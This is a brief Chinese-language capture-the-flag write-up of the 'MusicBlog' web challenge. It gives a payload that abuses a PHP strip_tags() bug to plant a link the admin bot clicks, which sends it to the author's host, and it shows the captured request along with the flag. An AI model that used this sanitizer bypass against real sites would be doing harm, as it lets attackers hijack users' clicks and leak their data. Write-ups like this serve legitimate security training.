# MusicBlog

這題還蠻有趣的

題目: 可以新增文章，內容可以帶`<audio>`標籤，然後可以選擇要不要讓 admin 按 like

由於輸入內容會過 `strip_tags()`，而且各種 XSS header 都有設好

加上看到 bot 會去對 `id=like` 的元素 click

所以方向就很明顯是去做 click jacking

<br>

難點在於 `strips_tags` 讓我們很難插入 `<audio>` 以外的標籤

而 `<audio>` 的 `on*` 系列的 event 都會被 CSP 擋，這條路也不通

最後目標放到 `strip_tags()` 上

搜了一下，發現這個 php 版本的 `strip_tags()` 有 bug:

https://bugs.php.net/bug.php?id=78814

所以最後只要

`<a/udio id="like" href="http://kaibro.tw:9487">zzxc</a>`

就能拿到 flag:

```
GET / HTTP/1.1
Host: kaibro.tw:9487
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: zer0pts{M4sh1m4fr3sh!!}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge/post.php?id=c8e7da47-b470-48b7-91cc-8bce3fd45cc3
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```
